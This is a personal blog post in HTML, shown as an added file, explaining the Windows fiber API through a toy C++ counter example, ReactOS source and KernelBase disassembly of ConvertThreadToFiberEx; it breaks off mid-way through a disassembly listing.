@@ -1,0 +1,831 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>A Foray For Fun into Windows Fibers — cd /wired</title>
+  <link rel="stylesheet" href="/css/styles.css">
+</head>
+
+<body>
+  <canvas id="spacefield" aria-hidden="true"></canvas>
+<script src="/js/spacefield.js" defer></script>
+
+  <div class="wrap">
+    <header class="site">
+  <div class="prompt">mike@malicious.dev:~$</div>
+  <h1>cd /wired <span class="cursor" aria-hidden="true"></span></h1>
+  <p class="post-meta">Random Technical Posts and Curios</p>
+</header>
+
+    <main role="main">
+      
+  <article class="post-single">
+    <header>
+      <h2 class="post-title">A Foray For Fun into Windows Fibers</h2>
+      <div class="post-meta">2021-01-01 · 20 min read</div>
+    </header>
+    <div class="content">
+      <p>The Windows fiber API has been described as one of the &ldquo;most elegant&rdquo; APIs available to the Windows programmer for manual execution scheduling.
+I&rsquo;m by no means an expert in how fibers work, nor how to deploy them into a large-scale application.
+There is not a lot of documentation about how fibers work internally, so I thought it might be at least interesting or helpful to write about some of what I found.</p>
+<h2 id="0x00-about">0x00 About</h2>
+<p>&ldquo;What is the Windows Fiber API?&rdquo;
+WELL, I&rsquo;m very glad you asked. I mean, why else would you be here?
+The Windows Fiber API exposes a means of manually &ldquo;scheduling&rdquo; execution within a process thread.</p>
+<p>To quote MSDN:
+&ldquo;A fiber is a unit of execution that must be manually scheduled by the application. Fibers run in the context of the threads that schedule them. Each thread can schedule multiple fibers. In general, fibers do not provide advantages over a well-designed multithreaded application.&rdquo;</p>
+<p>In regular terms, the Windows Fiber API provides developers with a means to manually schedule execution of many routines (converted to fibers) with a simple, lightweight API in one thread.
+(Many Fibers, One Thread, Manually Switched)</p>
+<p>A similar, thread-based API exists as the User Mode Scheduler API (UMS) which provides similar, more robust (read: complex), thread-based scheduling capabilities for developers.
+(Many Threads, One Scheduler Routine)</p>
+<p>While not the topic of this post, I found it relevant to call out because I think both APIs are pretty cool.</p>
+<h2 id="0x01-intro">0x01 Intro</h2>
+<p>The example MSDN code is very nice, and can be located here.</p>
+<p>For this much, MUCH simpler example, let&rsquo;s consider the following scenario:
+We would like to create three routines HotPotatoOne, HotPotatoTwo, and HotPotatoThree.
+Within one thread we want to schedule HotPotatoOne, HotPotatoTwo, and HotPotatoThree to &ldquo;pass&rdquo; eachother a &ldquo;potato&rdquo; (unsigned int).
+Each fiber will receive one unsigned int parameter and add it&rsquo;s respective number to it, and return:</p>
+<pre tabindex="0"><code>    HotPotatoOne adds 1
+    HotPotatoOne switches to HotPotatoTwo
+    HotPotatoTwo adds 2
+    HotPotatoTwo switches to HotPotatoThree
+    HotPotatoThree adds 3
+    HotPotatoThree switches to HotPotatoOne
+</code></pre><p>We will call each routine in a loop until the number is greater than 1337.</p>
+<p>A sane programmer would not use fibers for this.
+Luckily, as an IT consultant, I lost my sanity a while ago.</p>
+<p>Let&rsquo;s consider what we need to do in order to accomplish this task:</p>
+<ol>
+<li>Convert the instatniating (main, in our case) thread to a fiber (ConvertThreadToFiber)</li>
+<li>Create a fiber for each of the HotPotato routines (CreateFiber)</li>
+<li>Set the fiber data to a pointer to our starting number (GetFiberData, within the fiber)</li>
+<li>Switch to each of the HotPotato fibers (SwitchToFiber)</li>
+<li>Exit if the number is greater than 1337</li>
+</ol>
+<p>Now, let&rsquo;s see how the code looks!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e">HotPotatoOne</span>(LPVOID lpParam);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e">HotPotatoTwo</span>(LPVOID lpParam);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e">HotPotatoThree</span>(LPVOID lpParam);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define FIBER_MAIN 0
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FIBER_HP_ONE 1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FIBER_HP_TWO 2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define FIBER_HP_THREE 3
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> potato <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>LPVOID HOT_POTATOES[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> { NULL, NULL, NULL, NULL };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Step 1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	LPVOID AddrMainFiber <span style="color:#f92672">=</span> ConvertThreadToFiber(NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Step 2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	LPVOID AddrHotPotatoOne <span style="color:#f92672">=</span> CreateFiber(<span style="color:#ae81ff">0</span>, (LPFIBER_START_ROUTINE)HotPotatoOne, <span style="color:#f92672">&amp;</span>potato);
+</span></span><span style="display:flex;"><span>	LPVOID AddrHotPotatoTwo <span style="color:#f92672">=</span> CreateFiber(<span style="color:#ae81ff">0</span>, (LPFIBER_START_ROUTINE)HotPotatoTwo, <span style="color:#f92672">&amp;</span>potato);
+</span></span><span style="display:flex;"><span>	LPVOID AddrHotPotatoThree <span style="color:#f92672">=</span> CreateFiber(<span style="color:#ae81ff">0</span>, (LPFIBER_START_ROUTINE)HotPotatoThree, <span style="color:#f92672">&amp;</span>potato);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(AddrMainFiber <span style="color:#f92672">&amp;&amp;</span> AddrHotPotatoOne <span style="color:#f92672">&amp;&amp;</span> AddrHotPotatoTwo <span style="color:#f92672">&amp;&amp;</span> AddrHotPotatoThree)) {
+</span></span><span style="display:flex;"><span>		puts(<span style="color:#e6db74">&#34;Couldn&#39;t create one of the fibers :(</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Quitting&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	HOT_POTATOES[FIBER_HP_ONE] <span style="color:#f92672">=</span> AddrHotPotatoOne;
+</span></span><span style="display:flex;"><span>	HOT_POTATOES[FIBER_HP_TWO] <span style="color:#f92672">=</span> AddrHotPotatoTwo;
+</span></span><span style="display:flex;"><span>	HOT_POTATOES[FIBER_HP_THREE] <span style="color:#f92672">=</span> AddrHotPotatoThree;
+</span></span><span style="display:flex;"><span>	HOT_POTATOES[FIBER_MAIN] <span style="color:#f92672">=</span> AddrMainFiber;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Step 4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	SwitchToFiber(AddrHotPotatoOne);
+</span></span><span style="display:flex;"><span>	DeleteFiber(HOT_POTATOES[FIBER_HP_ONE]);
+</span></span><span style="display:flex;"><span>	DeleteFiber(HOT_POTATOES[FIBER_HP_TWO]);
+</span></span><span style="display:flex;"><span>	DeleteFiber(HOT_POTATOES[FIBER_HP_THREE]);
+</span></span><span style="display:flex;"><span>	DeleteFiber(HOT_POTATOES[FIBER_MAIN]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e">HotPotatoOne</span>(LPVOID lpParam) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Step 3
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span> potato_local <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)GetFiberData();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>potato_local <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;Hot Potato One adds 1, potato is now %d!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>potato_local);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Step 4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        SwitchToFiber(HOT_POTATOES[FIBER_HP_TWO]);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">while</span> (<span style="color:#f92672">*</span>potato_local <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1337</span>); <span style="color:#75715e">// Step 5
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    SwitchToFiber(HOT_POTATOES[FIBER_MAIN]);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e">HotPotatoTwo</span>(LPVOID lpParam) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Step 3
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span> potato_local <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)GetFiberData();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>potato_local <span style="color:#f92672">+=</span> <span style="color:#ae81ff">2</span>;
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;Hot Potato Two adds 2, potato is now %d!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>potato_local);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Step 4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        SwitchToFiber(HOT_POTATOES[FIBER_HP_THREE]);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">while</span> (<span style="color:#f92672">*</span>potato_local <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1337</span>); <span style="color:#75715e">// Step 5
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    SwitchToFiber(HOT_POTATOES[FIBER_MAIN]);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e">HotPotatoThree</span>(LPVOID lpParam) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Step 3
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span> potato_local <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)GetFiberData();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>potato_local <span style="color:#f92672">+=</span> <span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;Hot Potato Three adds 3, potato is now %d!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>potato_local);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Step 4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        SwitchToFiber(HOT_POTATOES[FIBER_HP_ONE]);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">while</span> (<span style="color:#f92672">*</span>potato_local <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1337</span>); <span style="color:#75715e">// Step 5
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    SwitchToFiber(HOT_POTATOES[FIBER_MAIN]);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The output from this is as expected!</p>
+<pre tabindex="0"><code>    Hot Potato One adds 1, potato is now 1!
+    Hot Potato Two adds 2, potato is now 3!
+    Hot Potato Three adds 3, potato is now 6!
+    Hot Potato One adds 1, potato is now 7!
+    Hot Potato Two adds 2, potato is now 9!
+    . . .
+    TRUNCATED
+    . . .
+    Hot Potato Three adds 3, potato is now 1332!
+    Hot Potato One adds 1, potato is now 1333!
+    Hot Potato Two adds 2, potato is now 1335!
+    Hot Potato Three adds 3, potato is now 1338!    
+</code></pre><p>Looking at each fiber method, the avid reader might notice something really odd about how we&rsquo;re handling control flow.
+Let&rsquo;s take a look at how we&rsquo;re <em>switching</em> to our HotPotato routines.
+For example, the first function, HotPotatoOne:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e">HotPotatoOne</span>(LPVOID lpParam) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Step 3
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span> potato_local <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)GetFiberData();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>potato_local <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;Hot Potato One adds 1, potato is now %d!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>potato_local);
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Step 4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        SwitchToFiber(HOT_POTATOES[FIBER_HP_TWO]);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">while</span> (<span style="color:#f92672">*</span>potato_local <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1337</span>); <span style="color:#75715e">// Step 5
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    SwitchToFiber(HOT_POTATOES[MAINFIBER]);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>After incrementing our potato, we switch to the next HotPotato function.
+Seems intuitive.
+So why the do/while and the SwitchToFiber back to the main thread?</p>
+<p>Consider an alternative function, BadHotPotatoOne:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e">BadHotPotatoOne</span>(LPVOID lpParam) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span> potato_local <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)GetFiberData();
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>potato_local <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Hot Potato One adds 1, potato is now %d!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>potato_local);
+</span></span><span style="display:flex;"><span>    SwitchToFiber(HOT_POTATOES[FIBER_HP_TWO]);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">*</span>potato_local <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1337</span>){
+</span></span><span style="display:flex;"><span>        SwitchToFiber(HOT_POTATOES[MAINFIBER]);
+</span></span><span style="display:flex;"><span>    }        
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>BadHotPotatoOne switches to HotPotatoTwo
+HotPotatoTwo switches to HotPotatoThree
+HotPotatoThree switches to BadHotPotatoOne</p>
+<p>What happens next?</p>
+<p>When HotPotatoThree calls SwitchToFiber back to BadHotPotatoOne, SwitchToFiber begins execution based on the next instruction of BadHotPotatoOne after the call to SwitchToFiber.
+In this case, the next instruction following our return to BadHotPotatoOne is our if statement, not the beginning of our fiber.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e">BadHotPotatoOne</span>(LPVOID lpParam) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span> potato_local <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)GetFiberData();
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>potato_local <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Hot Potato One adds 1, potato is now %d!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>potato_local);
+</span></span><span style="display:flex;"><span>    SwitchToFiber(HOT_POTATOES[FIBER_HP_TWO]); <span style="color:#f92672">&lt;-</span> Switches to HotPotatoTwo, then HotPotatoThree, then <span style="color:#f92672">-</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">*</span>potato_local <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1337</span>){ <span style="color:#f92672">&lt;-</span> Execution returns to the next statement when HotPotatoThree switches back
+</span></span><span style="display:flex;"><span>        SwitchToFiber(HOT_POTATOES[MAINFIBER]);
+</span></span><span style="display:flex;"><span>    }        
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>As such we want to make sure our desired behavior of looping is the next instruction after our call to SwitchToFiber.
+In our good function, HotPotatoOne, the next instruction is a &ldquo;while&rdquo; comparison, then a &ldquo;do&rdquo; loop which brings us back to HotPotatoTwo.
+This way, when execution is switched back to HotPotatoOne from HotPotatoThree, we loop rather than return.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> <span style="color:#66d9ef">__stdcall</span> <span style="color:#a6e22e">HotPotatoOne</span>(LPVOID lpParam) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Step 3
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span> potato_local <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>)GetFiberData();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">*</span>potato_local <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>            printf(<span style="color:#e6db74">&#34;Hot Potato One adds 1, potato is now %d!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">*</span>potato_local);
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e">// Step 4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            SwitchToFiber(HOT_POTATOES[FIBER_HP_TWO]); <span style="color:#f92672">&lt;-</span> Switches to HotPotatoTwo, then HotPotatoThree, then <span style="color:#f92672">-</span>
+</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">while</span> (<span style="color:#f92672">*</span>potato_local <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1337</span>); <span style="color:#f92672">&lt;-</span> Execution returns to comparison, keeps looping until <span style="color:#f92672">*</span>potato_local <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1337</span>
+</span></span><span style="display:flex;"><span>        SwitchToFiber(HOT_POTATOES[FIBER_MAIN]);
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>Neat.</p>
+<h2 id="0x02-instantiation">0x02 Instantiation</h2>
+<p>The documentation is a lie.
+No, seriously. Well. Kind of.</p>
+<p>The MSDN documentation for CreateFiber and ConvertThreadToFiber tells us that the return value is the address of the fiber.
+This is &ldquo;true,&rdquo; but misleading as the &ldquo;FIBER&rdquo; structure is not documented.
+I originally interpreted it as the base address of the routine I&rsquo;m Converting into/Creating as a fiber.</p>
+<p>The ACTUAL return value of these functions is a fiber object. (Object in a representative sense, not the type sense).
+This data structure seems to be very similar to a thread&rsquo;sCONTEXT struct used in the Get/SetThreadContext functions.</p>
+<p>Let&rsquo;s take a closer look into each function we called that returns an LPVOID fiber object (ConvertThreadToFiber, CreateFiber).
+The fine folks at ReactOS have written an implementation of ConvertThreadToFiber/Ex.
+Let&rsquo;s look at that source and compare with the disassembly of KernelBase!ConvertThreadToFiberEx.</p>
+<p>ReactOS <a href="https://doxygen.reactos.org/d9/d44/dll_2win32_2kernel32_2client_2fiber_8c_source.html">ConvertThreadToFiberEx</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span>LPVOID
+</span></span><span style="display:flex;"><span>WINAPI
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ConvertThreadToFiberEx</span>(_In_opt_ LPVOID lpParameter,
+</span></span><span style="display:flex;"><span>                    _In_ DWORD dwFlags)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    PTEB Teb;
+</span></span><span style="display:flex;"><span>    PFIBER Fiber;
+</span></span><span style="display:flex;"><span>    DPRINT1(<span style="color:#e6db74">&#34;Converting Thread to Fiber</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Check for invalid flags */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (dwFlags <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>FIBER_FLAG_FLOAT_SWITCH)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Fail */</span>
+</span></span><span style="display:flex;"><span>        SetLastError(ERROR_INVALID_PARAMETER);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Are we already a fiber? */</span>
+</span></span><span style="display:flex;"><span>    Teb <span style="color:#f92672">=</span> NtCurrentTeb();
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (Teb<span style="color:#f92672">-&gt;</span>HasFiberData)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Fail */</span>
+</span></span><span style="display:flex;"><span>        SetLastError(ERROR_ALREADY_FIBER);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Allocate the fiber */</span>
+</span></span><span style="display:flex;"><span>    Fiber <span style="color:#f92672">=</span> RtlAllocateHeap(RtlGetProcessHeap(),
+</span></span><span style="display:flex;"><span>                            <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>                            <span style="color:#66d9ef">sizeof</span>(FIBER));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>Fiber)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Fail */</span>
+</span></span><span style="display:flex;"><span>        SetLastError(ERROR_NOT_ENOUGH_MEMORY);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    . . .
+</span></span><span style="display:flex;"><span>     TRUNCATED, boring shit I don<span style="color:#960050;background-color:#1e0010">&#39;</span>t care about 
+</span></span><span style="display:flex;"><span>    . . .
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Associate the fiber to the current thread */</span>
+</span></span><span style="display:flex;"><span>    Teb<span style="color:#f92672">-&gt;</span>NtTib.FiberData <span style="color:#f92672">=</span> Fiber;
+</span></span><span style="display:flex;"><span>    Teb<span style="color:#f92672">-&gt;</span>HasFiberData <span style="color:#f92672">=</span> TRUE; <span style="color:#75715e">// what we really care about
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Return opaque fiber data */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (LPVOID)Fiber; <span style="color:#75715e">// MSDN says this is a pointer to the fiber, rather than the fiber object
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// HMMMMMMM    
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>     
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Compare this with the disassembly of KernelBase!ConvertThreadToFiberEx</p>
+<pre tabindex="0"><code>KERNELBASE!ConvertThreadToFiber:
+00007ffc`cdd58160 48895c2408         mov     qword ptr [rsp+8], rbx ss:000000c4`533bf970={FiberBlog!_NULL_IMPORT_DESCRIPTOR  (FiberBlog+0x22015) (00007ff6`49e62015)}
+00007ffc`cdd58165 4889742410         mov     qword ptr [rsp+10h], rsi
+00007ffc`cdd5816a 57                 push    rdi
+00007ffc`cdd5816b 4883ec20           sub     rsp, 20h
+00007ffc`cdd5816f 65488b3c2530000000 mov     rdi, qword ptr gs:[30h] 
+; rdi gets a pointer to the current _NT_TIB
+
+. . .
+ T R U N C A T E D 
+. . .
+
+
+00007ffc`cdd58252 66838fee17000004   or      word ptr [rdi+17EEh], 4
+; Setting the Teb-&gt;HasFiberData flag to True
+
+
+
+00007ffc`cdd5825a 48895720           mov     qword ptr [rdi+20h], rdx
+; Setting Teb-&gt;FiberData
+
+00007ffc`cdd5825e 488b742438         mov     rsi, qword ptr [rsp+38h]
+00007ffc`cdd58263 488bc3             mov     rax, rbx
+00007ffc`cdd58266 488b5c2430         mov     rbx, qword ptr [rsp+30h]
+00007ffc`cdd5826b 4883c420           add     rsp, 20h
+00007ffc`cdd5826f 5f                 pop     rdi
+00007ffc`cdd58270 c3                 ret 
+</code></pre><p>The behavior is, for all semantic purposes, identical. Thank you ReactOS team :)
+So what&rsquo;s the deal with the TEB and TIB?
+WELL, I&rsquo;m glad you asked.</p>
+<p>Let&rsquo;s take the two instructions from the disassembly and check to see what offsets they&rsquo;re referencing.
+(rdi == TEB)</p>
+<pre tabindex="0"><code>00007ffc`cdd58252 66838fee17000004   or      word ptr [rdi+17EEh], 4
+; Setting the Teb-&gt;HasFiberData flag to True
+
+00007ffc`cdd5825a 48895720           mov     qword ptr [rdi+20h], rdx
